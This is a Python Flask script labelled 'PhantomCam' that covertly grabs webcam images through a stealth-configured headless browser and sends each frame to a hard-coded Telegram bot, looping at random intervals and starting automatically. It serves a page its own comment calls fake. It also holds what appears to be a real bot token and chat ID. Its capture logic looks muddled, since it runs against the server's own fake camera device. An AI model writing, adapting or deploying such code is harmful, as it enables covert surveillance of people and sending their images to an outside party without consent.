# -*- coding: utf-8 -*-
from flask import Flask, render_template, jsonify, request
import asyncio
import aiohttp
import base64
import json
import os
import random
import string
import threading
import time
from datetime import datetime
from playwright.async_api import async_playwright
from PIL import Image
import io

app = Flask(__name__)

# ---------- TELEGRAM CONFIG ----------
BOT_TOKEN = "8896286925:AAH5OMU3eB5CVx7TOJ5-uxcCRtBfmMEcOtk"
CHAT_ID = "8790754582"
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"

# ---------- GLOBAL VARIABLES ----------
capture_thread = None
is_capturing = False
last_image = None
capture_log = []

# ---------- FILE NAME GENERATOR ----------
def generate_filename(ext="jpg"):
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    rand = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
    return f"cam_{ts}_{rand}.{ext}"

# ---------- CAPTURE ENGINE (RUNS IN BACKGROUND) ----------
async def capture_and_send():
    """Captures one frame and sends to Telegram."""
    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(
                headless=True,
                args=[
                    "--use-fake-ui-for-media-stream",
                    "--use-fake-device-for-media-stream",
                    "--disable-web-security",
                    "--no-sandbox",
                    "--disable-setuid-sandbox"
                ]
            )
            context = await browser.new_context(
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                viewport={"width": 1280, "height": 720}
            )
            page = await context.new_page()
            
            # Inject stealth
            await page.add_init_script("""
                Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
                window.chrome = { runtime: {} };
            """)
            
            # Load a dummy page (any URL)
            await page.goto("https://example.com")
            
            # Capture script
            js_code = """
            (function() {
                return new Promise((resolve) => {
                    let video = document.createElement('video');
                    video.autoplay = true;
                    video.muted = true;
                    let canvas = document.createElement('canvas');
                    let ctx = canvas.getContext('2d');
                    
                    navigator.getUserMedia = navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia;
                    if (!navigator.getUserMedia) {
                        resolve({ error: 'getUserMedia not supported' });
                        return;
                    }
                    
                    navigator.getUserMedia(
                        { video: { width: 640, height: 480, facingMode: 'environment' } },
                        function(stream) {
                            video.srcObject = stream;
                            video.onloadedmetadata = function() {
                                video.play();
                                canvas.width = video.videoWidth || 640;
                                canvas.height = video.videoHeight || 480;
                                setTimeout(() => {
                                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                                    let dataUrl = canvas.toDataURL('image/jpeg', 0.95);
                                    stream.getTracks().forEach(track => track.stop());
                                    resolve({ image: dataUrl });
                                }, 500);
                            };
                        },
                        function(err) {
                            resolve({ error: err.message });
                        }
                    );
                });
            })();
            """
            
            result = await page.evaluate(js_code)
            await browser.close()
            
            if result.get('error'):
                return {'status': 'error', 'message': result['error']}
            
            img_data_url = result['image']
            header, encoded = img_data_url.split(',', 1)
            img_bytes = base64.b64decode(encoded)
            
            # Send to Telegram
            fname = generate_filename()
            async with aiohttp.ClientSession() as session:
                data = aiohttp.FormData()
                data.add_field('chat_id', CHAT_ID)
                data.add_field('caption', f"📸 {fname} | PhantomCam")
                data.add_field('photo', img_bytes, filename=fname, content_type='image/jpeg')
                
                async with session.post(TELEGRAM_API, data=data) as resp:
                    if resp.status == 200:
                        return {'status': 'success', 'filename': fname}
                    else:
                        return {'status': 'error', 'message': f'Telegram error: {resp.status}'}
                        
    except Exception as e:
        return {'status': 'error', 'message': str(e)}

def background_capture_loop():
    """Runs capture in an infinite loop with random intervals."""
    global is_capturing, capture_log
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    while is_capturing:
        try:
            result = loop.run_until_complete(capture_and_send())
            log_entry = {
                'time': datetime.now().isoformat(),
                'status': result.get('status'),
                'message': result.get('message') or result.get('filename', '')
            }
            capture_log.append(log_entry)
            # Keep log size manageable
            if len(capture_log) > 100:
                capture_log = capture_log[-100:]
            
            # Random sleep between 5-15 seconds
            sleep_time = random.uniform(5.0, 15.0)
            time.sleep(sleep_time)
            
        except Exception as e:
            print(f"Background error: {e}")
            time.sleep(10)

# ---------- FLASK ROUTES ----------
@app.route('/')
def index():
    """Serve the fake HTML page."""
    return render_template('index.html')

@app.route('/api/status')
def status():
    """Return current capture status."""
    return jsonify({
        'is_capturing': is_capturing,
        'log_count': len(capture_log),
        'last_log': capture_log[-5:] if capture_log else []
    })

@app.route('/api/start', methods=['POST'])
def start_capture():
    """Start the background capture thread."""
    global is_capturing, capture_thread
    if not is_capturing:
        is_capturing = True
        capture_thread = threading.Thread(target=background_capture_loop, daemon=True)
        capture_thread.start()
        return jsonify({'status': 'started'})
    return jsonify({'status': 'already_running'})

@app.route('/api/stop', methods=['POST'])
def stop_capture():
    """Stop the background capture."""
    global is_capturing
    is_capturing = False
    return jsonify({'status': 'stopped'})

@app.route('/api/log')
def get_log():
    """Return capture log."""
    return jsonify({'log': capture_log})

# ---------- RUN APP ----------
if __name__ == '__main__':
    # Auto-start capture when server runs
    if not is_capturing:
        is_capturing = True
        capture_thread = threading.Thread(target=background_capture_loop, daemon=True)
        capture_thread.start()
    
    # For production (Render, PythonAnywhere, etc.)
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
